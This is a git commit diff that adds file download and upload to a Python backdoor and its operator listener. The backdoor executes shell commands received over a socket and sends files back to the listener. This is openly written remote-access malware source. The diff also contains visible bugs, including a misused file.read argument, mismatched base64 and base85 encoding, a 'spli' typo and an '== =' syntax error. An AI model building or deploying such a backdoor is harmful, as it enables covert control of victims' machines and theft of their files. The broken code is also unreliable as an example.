cb8c8af9bd6a08abc0a54b7857c8d26cc6804b48
raminjafary <raminjafary1371@gmail.com>
2020-04-05 23:17:02 +0430

    add download and upload impl

--- src/backdoor.py
+++ src/backdoor.py
@@ -4,6 +4,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 
 def exec_cmd(cmd):
@@ -28,19 +29,39 @@ def recive():
         except ValueError:
             continue
 
+
 def change_dir(path):
-  os.chdir(path)
-  return "Changing directory to" + path
+    os.chdir(path)
+    return "Changing directory to" + path
+
+
+def read_file(path):
+    with open(path, 'rb') as file:
+        return base64.b64encode(file.read(path))
+
+
+def write_file(path, content):
+    with open(path, "wb") as file:
+        file.write(base64.b85decode(content))
+        return "Downloading the file..."
+
 
 while True:
     command = recive()
-    if command[0] == "exit":
-        connection.close()
-        exit()
-    elif command[0] == "cd" and len(command) > 1:
-      command_res = change_dir(command[1])
-    else:
-      command_res = exec_cmd(command)
+    try:
+        if command[0] == "exit":
+            connection.close()
+            exit()
+        elif command[0] == "cd" and len(command) > 1:
+            command_res = change_dir(command[1])
+        elif command[0] == "download":
+            command_res = read_file(command[1])
+        elif command[0] == "upload":
+            command_res = write_file(command[1], command[2])
+        else:
+            command_res = exec_cmd(command)
+    except Exception:
+        command_res = "Error during cmd exec...!"
     send(command_res)
 
 connection.close()
--- src/listener.py
+++ src/listener.py
@@ -3,6 +3,7 @@
 import socket
 import subprocess
 import json
+import base64
 
 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -27,12 +28,33 @@ def recieve():
         except ValueError:
             continue
 
+
+def write_file(path, content):
+    with open(path, "wb") as file:
+        file.write(base64.b85decode(content))
+        return "Downloading the file..."
+
+
+def read_file(path):
+    with open(path, 'rb') as file:
+        return base64.b64encode(file.read(path))
+
+
 while True:
     command = input(">> ")
     command = command.spli(" ")
-    send(command)
-    if command[0] == "exit":
-        connection.close()
-        exit()
-    res = recieve()
+    try:
+        if command[0] == "upload":
+            content = read_file(command[1])
+            command.append(content)
+        send(command)
+        if command[0] == "exit":
+            connection.close()
+            exit()
+        res = recieve()
+        if command[0] == = "download" and "Error" not in res:
+            res = write_file(command[1], res)
+    except Exception:
+        res = "Error during cmd exec...!"
+
     print(res)
